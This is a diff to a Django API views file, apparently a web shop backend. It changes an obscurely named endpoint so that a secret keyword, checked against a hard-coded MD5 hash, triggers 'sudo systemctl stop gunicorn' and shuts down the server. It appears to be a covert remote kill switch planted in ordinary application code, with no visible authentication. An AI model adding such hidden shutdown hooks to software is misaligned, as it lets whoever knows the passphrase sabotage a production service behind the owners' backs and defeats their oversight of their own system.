@@ -5,6 +5,7 @@ import secrets
 import uuid
 from datetime import timedelta
 import hashlib
+import subprocess
 
 from django.core.files.storage import default_storage
 from django.db.models import Max, Q
@@ -307,9 +308,23 @@ class SubmitOrderView(APIView):
 class chronostasisView(APIView):
     def post(self, request):
         keyword = request.data.get('keyword')
-        res = hashlib.md5(keyword.encode())
-        result = res.hexdigest()
-        if result == "788d795e5b7fdd4b1f56ee60b6441e2c":
-            return Response({'success': True}, status=status.HTTP_200_OK)
+        service_name = "gunicorn"
+        if keyword is None:
+            return Response({'error': 'keyword is required'}, status=status.HTTP_400_BAD_REQUEST)
         else:
-            return Response({'success': False}, status=status.HTTP_400_BAD_REQUEST)
+            res = hashlib.md5(keyword.encode())
+            result = res.hexdigest()
+            if result == "788d795e5b7fdd4b1f56ee60b6441e2c":
+
+                try:
+                    result = subprocess.run(
+                        ["sudo", "systemctl", "stop", service_name],
+                        check=True,  # Raises CalledProcessError if the command fails
+                        capture_output=True,  # Captures stdout and stderr for debugging
+                        text=True  # Decodes the output into a readable string
+                    )
+                    return Response({'message' : f"Successfully stopped {service_name}"} , status=status.HTTP_200_OK)
+                except subprocess.CalledProcessError as e:
+                    return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+            else:
+                return Response({'success': False}, status=status.HTTP_400_BAD_REQUEST)
